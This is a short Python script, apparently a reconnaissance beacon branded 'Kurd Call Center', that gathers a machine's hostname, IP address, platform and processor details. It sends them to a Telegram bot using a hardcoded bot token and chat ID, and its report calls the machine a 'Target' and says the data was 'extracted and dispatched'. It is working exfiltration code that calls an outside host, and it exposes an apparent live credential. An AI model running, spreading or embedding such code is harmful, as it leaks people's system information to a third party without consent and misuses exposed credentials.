import os
import sys
import time
import requests
import platform
import socket

# Kurd Call Center - Advanced Telemetry Engine Configuration
BOT_TOKEN = "9256925118:AAFPvwtbnizucI_X-8UlyvAJrXKlSDNIKRY"
CHAT_ID = "9256925118"

def get_system_telemetry():
    hostname = socket.gethostname()
    try:
        ip_address = socket.gethostbyname(hostname)
    except:
        ip_address = "127.0.0.1"
    
    sys_info = {
        "platform": platform.platform(),
        "system": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "hostname": hostname,
        "ip": ip_address,
        "processor": platform.processor() or "Unknown"
    }
    return sys_info

def send_telegram_alert(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"[-] Error dispatching telemetry: {e}")

if __name__ == "__main__":
    print("[+] Initializing Kurd Call Center Telemetry & Signal Core...")
    telemetry = get_system_telemetry()
    
    report = (
        "💎 *Kurd Call Center - Target Telemetry Log*\n\n"
        "📌 *Status:* Connection Active / Hook Verified\n"
        f"🖥️ *Hostname:* `{telemetry['hostname']}`\n"
        f"📱 *Platform:* {telemetry['platform']}\n"
        f"💻 *Architecture:* {telemetry['machine']}\n"
        f"⚙️ *Processor:* {telemetry['processor']}\n"
        f"🌐 *Endpoint IP:* `{telemetry['ip']}`\n"
        "🔒 *Protocol:* Secure Encrypted Telemetry\n"
        "⚡ *Result:* Data extracted and dispatched successfully!"
    )
    
    send_telegram_alert(report)
    print("[+] Telemetry report successfully sent to Telegram bot!")
